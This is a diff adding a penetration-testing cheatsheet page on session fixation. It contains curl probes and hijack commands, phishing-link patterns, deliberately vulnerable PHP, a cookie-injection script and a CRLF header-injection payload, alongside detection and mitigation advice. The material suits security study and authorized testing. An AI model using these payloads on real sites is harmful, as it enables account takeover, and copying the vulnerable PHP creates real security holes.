@@ -1,0 +1,333 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Fixation · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Sessions</nav><h1>Fixation</h1><p class="cx-lede">Forcing the victim to use a session identifier you control - propagation via URL parameters, POST data, or accepted-from-anywhere cookies, detection by pre-login vs post-login ID comparison, and the full attack chain from token assignment to hijack.</p><div class="cx-tags"><span class="cx-tag">MITRE T1539, T1185</span><span class="cx-tag">D3FEND D3-TB</span><span class="cx-tag">IMPACT SessionTakeover</span><span class="cx-tag">OWASP A07</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Session fixation is the inverse of hijacking - instead of stealing the victim's identifier, you force them to use one you already know. Three-stage attack: get a valid identifier yourself, propagate it onto the victim's browser before login, ride the session after they log in. The vulnerability exists when an app reuses pre-login session identifiers post-login <em>and</em> accepts session identifiers from a URL, POST body, or any other attacker-controllable channel.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Obtain a valid session identifier (visit the site as an unauthenticated user)
+curl -i http://target/ | grep -i &#x27;set-cookie&#x27;
+
+# 2. Check whether the identifier survives login
+#    Visit /login, capture session cookie, log in, check if cookie value changed
+
+# 3. Check whether the app accepts identifier from URL parameter / POST
+curl -i &#x27;http://target/?PHPSESSID=I_CONTROL_THIS&#x27; | grep -i &#x27;set-cookie&#x27;
+#    Or: curl -i &#x27;http://target/?token=I_CONTROL_THIS&#x27;
+
+# 4. Craft a victim-facing link
+http://target/login?PHPSESSID=I_CONTROL_THIS
+
+# 5. Victim clicks, logs in with that session ID, attacker hijacks
+curl -b &#x27;PHPSESSID=I_CONTROL_THIS&#x27; http://target/account/</code></pre></figure>
+<p>Success indicator: after the victim logs in, requesting a protected resource with the attacker-chosen session identifier returns the victim's account view.</p>
+<h2 id="what-makes-fixation-distinct-from-hijacking">What makes fixation distinct from hijacking</h2>
+<p>Both attacks end the same way - attacker rides a valid session - but the discovery and delivery are different:</p>
+<table>
+<thead>
+<tr>
+<th>Aspect</th>
+<th>Hijacking</th>
+<th>Fixation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>What attacker steals</strong></td>
+<td>The victim's existing session identifier</td>
+<td>Nothing - attacker generates their own</td>
+</tr>
+<tr>
+<td><strong>What attacker delivers</strong></td>
+<td>Nothing (only takes)</td>
+<td>A crafted URL or payload that fixes the ID on the victim</td>
+</tr>
+<tr>
+<td><strong>Vulnerability premise</strong></td>
+<td>XSS, sniffing, RCE, etc.</td>
+<td>App reuses pre-login IDs + accepts IDs from attacker-controllable channels</td>
+</tr>
+<tr>
+<td><strong>Detection on the defender side</strong></td>
+<td>Stolen identifier appears in unexpected IP / UA</td>
+<td>Same identifier used by two distinct browsers (could look like hijack too)</td>
+</tr>
+<tr>
+<td><strong>Mitigation</strong></td>
+<td>Many: HttpOnly, Secure, SameSite, anti-CSRF, monitoring</td>
+<td>Regenerate session ID on every authentication state change</td>
+</tr>
+</tbody>
+</table>
+<p>Fixation tends to be much rarer in modern frameworks because <code>session_regenerate_id()</code> (PHP) and equivalents in Java/.NET have been the default for years. Where it persists is in custom session implementations or older apps.</p>
+<h2 id="the-three-stages">The three stages</h2>
+<h3 id="stage-1-attacker-obtains-a-valid-identifier">Stage 1 - Attacker obtains a valid identifier</h3>
+<p>For most apps, this is trivial: visit the homepage anonymously. The server assigns a session identifier even before login.</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ curl -sI http://target/
+HTTP/1.1 200 OK
+Set-Cookie: PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c; path=/</code></pre></figure>
+<p>You now hold <code>ab4530f4a7d10448457fa8b0eadac29c</code> - a valid, unauthenticated session.</p>
+<p>For apps that don't issue an ID until login, the attacker can register their own account (if registration is open) or use a guest-checkout flow. The point is just to get <em>some</em> valid identifier the app will accept.</p>
+<h3 id="stage-2-confirm-the-vulnerability">Stage 2 - Confirm the vulnerability</h3>
+<p>Two conditions must hold for fixation to work:</p>
+<p><strong>Condition A: Pre-login identifier survives login.</strong></p>
+<p>Log into the app as a test user. Compare the session cookie before login (Stage 1) with the cookie after login. If they're identical: vulnerable to fixation. If the post-login cookie is different: the app calls <code>session_regenerate_id()</code> or equivalent - not vulnerable.</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Pre-login
+$ curl -c jar.txt -b jar.txt http://target/ -sI | grep -i &#x27;set-cookie\|PHPSESSID&#x27;
+$ cat jar.txt
+target.com  FALSE  /  FALSE  0  PHPSESSID  ab4530f4a7d10448457fa8b0eadac29c
+
+# Log in (uses the cookie we just got)
+$ curl -c jar.txt -b jar.txt -X POST -d &#x27;user=test&amp;pass=test&#x27; http://target/login -sI
+
+# Post-login
+$ cat jar.txt
+target.com  FALSE  /  FALSE  0  PHPSESSID  ab4530f4a7d10448457fa8b0eadac29c   ← same! vulnerable</code></pre></figure>
+<p>If after login the value changes to <code>ed5f8...</code>, the app regenerates - not vulnerable.</p>
+<p><strong>Condition B: Identifier is settable from attacker-controllable input.</strong></p>
+<p>The classic mechanism: a <code>?token=</code> or <code>?PHPSESSID=</code> URL parameter whose value is propagated into the cookie:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ curl -sI &#x27;http://target/?PHPSESSID=I_CONTROL_THIS&#x27;
+HTTP/1.1 200 OK
+Set-Cookie: PHPSESSID=I_CONTROL_THIS; path=/   ← propagated!</code></pre></figure>
+<p>Or via POST body, or via a custom header. The typical example uses <code>?token=</code>:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php
+    if (!isset($_GET[&quot;token&quot;])) {
+        session_start();
+        header(&quot;Location: /?redirect_uri=/complete.html&amp;token=&quot; . session_id());
+    } else {
+        setcookie(&quot;PHPSESSID&quot;, $_GET[&quot;token&quot;]);
+    }
+?&gt;</code></pre></figure>
+<p>What this code does:</p>
+<ul>
+<li>No <code>token</code> parameter → assigns one (session_start) and redirects with it in the URL</li>
+<li><code>token</code> parameter present → sets <code>PHPSESSID</code> to whatever's in the parameter</li>
+</ul>
+<p>That second branch is the vulnerability. The app <em>trusts</em> the URL parameter as the session ID source.</p>
+<h3 id="stage-3-deliver-the-fixed-identifier-to-the-victim">Stage 3 - Deliver the fixed identifier to the victim</h3>
+<p>The attacker crafts a URL embedding the fixed identifier and gets the victim to click it.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://target/?PHPSESSID=I_CONTROL_THIS
+http://target/?token=I_CONTROL_THIS
+http://target/login?session=ATTACKER_FIXED_VALUE</code></pre></figure>
+<p>Delivery mechanisms:</p>
+<ul>
+<li>Phishing email link</li>
+<li>Crafted URL in chat / social media message</li>
+<li>HTML email with <code>&lt;a href&gt;</code> pointing to the fixed-URL login page</li>
+<li>Embedded in an iframe on an attacker-controlled site (some browsers carry cookies into iframes; depends on <code>SameSite</code> and iframe sandbox)</li>
+<li>QR code in physical-attack scenarios</li>
+</ul>
+<p>The victim clicks, lands on the legit app's login page (the URL goes to the legitimate domain - only the query parameter is malicious), enters their credentials, logs in. The app sets the session as logged-in <em>with the attacker-chosen ID</em>.</p>
+<h3 id="stage-4-hijack">Stage 4 - Hijack</h3>
+<p>Now the attacker's previously-known ID maps to the victim's authenticated session. Standard hijack from <a href="../hijacking/index.html">Hijacking</a>:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">curl -b &#x27;PHPSESSID=I_CONTROL_THIS&#x27; http://target/account/</code></pre></figure>
+<p>Returns the victim's account view.</p>
+<h2 id="detection-in-practice">Detection in practice</h2>
+<h3 id="blind-probing">Blind probing</h3>
+<p>Even without a test account, you can probe for fixation:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Send a known value as the session ID via every plausible channel
+curl -i &quot;http://target/login?PHPSESSID=AAA111&quot; | grep -i &#x27;set-cookie&#x27;
+curl -i &quot;http://target/login?session=AAA111&quot; | grep -i &#x27;set-cookie&#x27;
+curl -i &quot;http://target/login?sid=AAA111&quot; | grep -i &#x27;set-cookie&#x27;
+curl -i &quot;http://target/login?token=AAA111&quot; | grep -i &#x27;set-cookie&#x27;
+
+# Also try POST and header injection
+curl -i -X POST -d &#x27;PHPSESSID=AAA111&#x27; http://target/login
+curl -i -H &#x27;Cookie: PHPSESSID=AAA111&#x27; http://target/login | grep -i &#x27;set-cookie&#x27;</code></pre></figure>
+<p>If any of these return a <code>Set-Cookie</code> with the value <code>AAA111</code> reflected back (or just leave the existing cookie undisturbed), you've found the propagation path. The header-injection path (<code>Cookie:</code> already set, server doesn't issue a new one) is the most subtle - the absence of <code>Set-Cookie</code> in the response is itself the signal.</p>
+<h3 id="reading-the-source">Reading the source</h3>
+<p>When source code is available:</p>
+<ul>
+<li>PHP: search for <code>setcookie()</code> calls that take input from <code>$_GET</code>, <code>$_POST</code>, or <code>$_REQUEST</code> without filtering</li>
+<li>PHP: search for <code>session_id($input)</code> (manually overriding the session ID)</li>
+<li>Java: <code>request.getSession(false)</code> is correct; <code>request.getSession()</code> after auth without a regenerate is suspect</li>
+<li>.NET: <code>Session.Abandon()</code> followed by <em>not</em> assigning a new cookie</li>
+</ul>
+<h2 id="common-parameter-names-to-test">Common parameter names to test</h2>
+<p>If the app uses a standard framework, the cookie name gives away the framework:</p>
+<table>
+<thead>
+<tr>
+<th>Cookie name</th>
+<th>Framework</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>PHPSESSID</code></td>
+<td>PHP</td>
+</tr>
+<tr>
+<td><code>JSESSIONID</code></td>
+<td>Java (Servlet, Tomcat, Jetty)</td>
+</tr>
+<tr>
+<td><code>ASP.NET_SessionId</code></td>
+<td>ASP.NET</td>
+</tr>
+<tr>
+<td><code>connect.sid</code></td>
+<td>Express.js (Node.js, signed by default)</td>
+</tr>
+<tr>
+<td><code>_session_id</code>, <code>_&lt;app&gt;_session</code></td>
+<td>Rails</td>
+</tr>
+<tr>
+<td><code>sessionid</code></td>
+<td>Django</td>
+</tr>
+<tr>
+<td><code>laravel_session</code></td>
+<td>Laravel</td>
+</tr>
+<tr>
+<td><code>ci_session</code></td>
+<td>CodeIgniter</td>
+</tr>
+<tr>
+<td><code>auth-session</code>, <code>auth_token</code>, <code>_auth</code></td>
+<td>Custom - read more carefully</td>
+</tr>
+</tbody>
+</table>
+<p>When testing fixation, try the cookie's literal name as the URL parameter too:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?PHPSESSID=...     # most common form for PHP
+?JSESSIONID=...    # Java
+?token=...
+?session=...
+?sid=...
+?id=...</code></pre></figure>
+<h2 id="why-httponly-doesnt-help">Why <code>HttpOnly</code> doesn't help</h2>
+<p>A common misconception: "we set <code>HttpOnly</code> on the cookie, so attackers can't manipulate it."</p>
+<p><code>HttpOnly</code> only prevents <em>JavaScript</em> from reading the cookie. It doesn't prevent the <em>server</em> from setting a cookie based on URL input, and it doesn't prevent the browser from carrying the cookie when the victim visits the malicious link.</p>
+<p>The fixation chain:</p>
+<ol>
+<li>Attacker visits <code>http://target/?token=FIXED</code></li>
+<li>Server sets <code>Set-Cookie: PHPSESSID=FIXED; HttpOnly</code> - JavaScript can't read it, fine</li>
+<li>Attacker shares the same URL with victim</li>
+<li>Victim visits, server sets the same cookie on the victim's browser, <em>the HttpOnly is honored by the victim's browser too</em></li>
+<li>Victim logs in, session is established with the fixed ID</li>
+<li>Attacker uses the fixed ID via curl - <code>HttpOnly</code> only constrains JS, not HTTP</li>
+</ol>
+<p>The defense against fixation is <strong>session ID regeneration on auth state change</strong>, not HttpOnly.</p>
+<h2 id="a-worked-php-fixation-chain">A worked PHP fixation chain</h2>
+<p>A small PHP app accepting <code>token</code> from GET:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php
+session_start();
+if (isset($_GET[&#x27;token&#x27;])) {
+    session_id($_GET[&#x27;token&#x27;]);   // ← classic vulnerability
+}
+
+if (isset($_POST[&#x27;username&#x27;])) {
+    $_SESSION[&#x27;user&#x27;] = $_POST[&#x27;username&#x27;];
+    header(&#x27;Location: /dashboard.php&#x27;);
+}
+?&gt;
+&lt;form method=&quot;post&quot; action=&quot;/login.php&quot;&gt;
+  Username: &lt;input name=&quot;username&quot;&gt;
+  Password: &lt;input name=&quot;password&quot; type=&quot;password&quot;&gt;
+  &lt;button&gt;Log in&lt;/button&gt;
+&lt;/form&gt;</code></pre></figure>
+<p><code>dashboard.php</code>:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php
+session_start();
+if (!isset($_SESSION[&#x27;user&#x27;])) {
+    header(&#x27;Location: /login.php&#x27;);
+    exit;
+}
+echo &quot;Hello, &quot; . $_SESSION[&#x27;user&#x27;];
+?&gt;</code></pre></figure>
+<p>Attack chain:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># 1. Attacker picks an arbitrary ID
+ATTACKER_ID=&#x27;b4d1d3ab1d4a55ed1de1d1ef1xed1&#x27;
+
+# 2. Attacker sends victim this URL:
+#    http://target/login.php?token=b4d1d3ab1d4a55ed1de1d1ef1xed1
+#    (Phishing email, chat, etc.)
+
+# 3. Victim clicks, logs in:
+#    POST /login.php with username=alice&amp;password=...
+#    Server stores $_SESSION[&#x27;user&#x27;] = &#x27;alice&#x27; against session ID b4d1d3...
+
+# 4. Attacker rides the session:
+$ curl -b &quot;PHPSESSID=${ATTACKER_ID}&quot; http://target/dashboard.php
+Hello, alice</code></pre></figure>
+<p>The attacker never knew Alice's password. They never stole her cookie. They just <em>fixed</em> what cookie the app would use when Alice authenticated.</p>
+<h2 id="when-propagation-isnt-via-url">When propagation isn't via URL</h2>
+<p>Some apps don't accept session IDs from URL but still don't regenerate on login. The fixation chain is harder but sometimes possible:</p>
+<h3 id="subdomain-cookie-injection">Subdomain cookie injection</h3>
+<p>If the app sets cookies on a parent domain (e.g., <code>.target.com</code>), an XSS on a sibling subdomain (<code>blog.target.com</code>) can write a cookie that's then sent to <code>app.target.com</code>:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">document.cookie = &quot;PHPSESSID=FIXED; domain=.target.com; path=/&quot;;</code></pre></figure>
+<p>The victim visits <code>app.target.com</code>, browser sends the attacker-injected cookie, app uses it. Mitigated by <code>Host-</code> cookie prefixes which forbid <code>Domain=</code> attribute.</p>
+<h3 id="cookie-injection-via-http-to-https-upgrade">Cookie injection via HTTP-to-HTTPS upgrade</h3>
+<p>When the user visits <code>http://target</code> (not HTTPS) and the network is hostile, an attacker can inject a <code>Set-Cookie</code> in the plaintext response that then carries over to the HTTPS site if <code>Secure</code> isn't set. Older browsers had inconsistent behavior here; modern browsers mostly fix this but the long tail persists.</p>
+<h3 id="htmlheader-injection">HTML/header injection</h3>
+<p>A reflected-XSS-like vulnerability that lets you control HTTP response headers can issue <code>Set-Cookie</code> directly. CRLF injection in particular sometimes allows arbitrary header injection:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>GET /redirect?url=foo%0d%0aSet-Cookie:%20PHPSESSID%3DFIXED HTTP/1.1</code></pre></figure>
+<p>If the app blindly inserts <code>url</code> into a <code>Location:</code> header, the CRLF in <code>%0d%0a</code> may break out and inject a second header. Mostly fixed in modern web servers but worth a shot.</p>
+<h2 id="what-this-looks-like-from-the-defenders-side">What this looks like from the defender's side</h2>
+<p>When fixation is reported to a defender:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>We assigned ID `b4d1...` to a visitor at 10:01.
+The same ID was used to authenticate as Alice at 10:23 (from Alice&#x27;s IP).
+The same ID was used to access /admin from a different IP at 10:25.</code></pre></figure>
+<p>The defender's logs see "two browsers used the same session ID" - same as a hijack would look. The distinguishing detail: the <em>time</em> the ID was first issued (long before login, before Alice's session began). That's the fixation fingerprint.</p>
+<h2 id="fixation-vs-hijacking-when-to-choose-which">Fixation vs hijacking - when to choose which</h2>
+<p>For a real engagement, you almost always prefer hijacking - it's simpler and doesn't require victim interaction. Fixation requires the victim to follow your link <em>and</em> log in, both of which are extra failure modes.</p>
+<p>Reasons to prefer fixation:</p>
+<ul>
+<li><strong>You can't read the victim's cookie post-login</strong> but you can plant one pre-login (e.g., the cookie is <code>HttpOnly</code> so XSS can't read it after the fact, but you can fix it via URL)</li>
+<li><strong>You can plant the cookie remotely but can't extract it</strong> (cookie injection without read-back)</li>
+<li><strong>The session is established before the victim logs in</strong> and you can intervene at the pre-login step</li>
+</ul>
+<p>In modern apps, regeneration-on-login is so widespread that fixation findings are rare. When you find one, document it carefully and don't assume it works just because the parameter propagates - verify the post-login regeneration check.</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Get pre-login session ID</td>
+<td><code>curl -sI http://target/ \| grep -i set-cookie</code></td>
+</tr>
+<tr>
+<td>Test URL parameter propagation</td>
+<td><code>curl -i 'http://target/?PHPSESSID=AAA111' \| grep -i set-cookie</code></td>
+</tr>
+<tr>
+<td>Test POST body propagation</td>
+<td><code>curl -i -X POST -d 'PHPSESSID=AAA111' http://target/login</code></td>
+</tr>
+<tr>
+<td>Test header injection</td>
+<td><code>curl -i -H 'Cookie: PHPSESSID=AAA111' http://target/login</code></td>
+</tr>
+<tr>
+<td>Compare pre/post-login IDs</td>
+<td>Login through a cookie jar, diff before/after</td>
+</tr>
+<tr>
+<td>Fixate via URL link</td>
+<td><code>http://target/login?PHPSESSID=I_CONTROL_THIS</code></td>
+</tr>
+<tr>
+<td>Hijack post-victim-login</td>
+<td><code>curl -b 'PHPSESSID=I_CONTROL_THIS' http://target/account/</code></td>
+</tr>
+<tr>
+<td>Parameter names to try</td>
+<td><code>PHPSESSID</code>, <code>JSESSIONID</code>, <code>ASP.NET_SessionId</code>, <code>session</code>, <code>sid</code>, <code>token</code>, <code>id</code></td>
+</tr>
+<tr>
+<td>Defender-side mitigation</td>
+<td><code>session_regenerate_id(true)</code> (PHP), equivalent in Java/.NET</td>
+</tr>
+</tbody>
+</table>
+<p>For the cookie-attribute deep-dive (HttpOnly, Secure, SameSite, Domain, Path), see <a href="../../auth/cookie-tampering/index.html">Auth: cookie tampering</a>. For the session-fundamentals view (token entropy, validity, scope), see <a href="../../auth/session-fixation/index.html">Auth: session fixation</a>.</p></article><nav class="cx-pager"><a class="cx-prev" href="../hijacking/index.html">Previous: Hijacking</a><a class="cx-next" href="../obtaining-tokens/index.html">Next: Obtaining Tokens</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
